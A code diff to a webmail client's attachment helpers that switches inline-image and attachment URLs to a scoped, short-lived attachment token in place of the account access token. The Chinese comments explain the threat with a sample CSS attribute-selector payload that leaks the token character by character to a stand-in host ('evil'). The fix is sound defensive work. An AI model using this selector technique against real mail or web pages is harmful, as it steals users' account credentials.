@@ -13,13 +13,23 @@ export function isPreviewable(a: Attachment): boolean {
 /**
  * 返回带 token 的附件访问 URL（用于 img/iframe/新标签预览）。
  * token 走 query 参数而非请求头，因为 img src / a href 无法附带自定义请求头。
+ *
+ * ⚠⚠ 只要这个 URL 会被写进邮件正文文档（cid: 内联图改写），就**必须**传 token 参数，
+ * 传详情接口给的 attachment_token，绝不能让它退回到 access token。
+ *
+ * 原因：正文文档里的内容由发件人完全控制。开启远程内容后 style-src 允许内联样式，
+ * 邮件自带的 <style> 块可以写 `img[src^="…access_token=eyJhb"]{background:url(https://evil/1)}`
+ * 这样的属性选择器，用「命中就发一个远程请求」的方式把 token 逐字符问出来，
+ * 全程不需要执行任何脚本，CSP 的 script-src 与沙箱都拦不住。
+ * access token 一旦外泄就是整个账号；attachment_token 只能取这一封邮件的附件、一小时过期。
  */
 export function attachmentUrl(
   messageId: number,
   idx: number,
-  opts?: { download?: boolean },
+  opts?: { download?: boolean; token?: string },
 ): string {
-  const t = auth.access ?? ''
+  // 没有 attachment_token（后端尚未升级 / 详情来自旧缓存）才退回 access token
+  const t = opts?.token || auth.access || ''
   const dl = opts?.download ? '&dl=1' : ''
   return `/api/v1/messages/${messageId}/attachments/${idx}?access_token=${encodeURIComponent(t)}${dl}`
 }
@@ -54,11 +64,16 @@ export async function downloadAttachment(
  *
  * content_id 比对忽略大小写，同时兼容带尖括号 `<cid>` 的形式（仅匹配括号内的值）。
  * 前导字符兼容引号、括号与无引号属性（`src=cid:xxx`）。
+ *
+ * ⚠ token 必须传详情接口给的 attachment_token：改写结果直接落进邮件正文文档，
+ * 而那份文档的内容由发件人控制，可以用 CSS 属性选择器把 URL 里的令牌逐字符外泄。
+ * 完整说明见 attachmentUrl。
  */
 export function rewriteCidLinks(
   html: string,
   messageId: number,
   attachments: Attachment[],
+  token?: string,
 ): string {
   return html.replace(/(["'(=])cid:([^"')\s>]+)/gi, (m, pre, cid) => {
     // 去掉可能的 < > 包裹
@@ -68,6 +83,6 @@ export function rewriteCidLinks(
       return a.content_id.replace(/^<|>$/g, '').toLowerCase() === cidClean
     })
     if (idx < 0) return m
-    return pre + attachmentUrl(messageId, idx)
+    return pre + attachmentUrl(messageId, idx, { token })
   })
 }
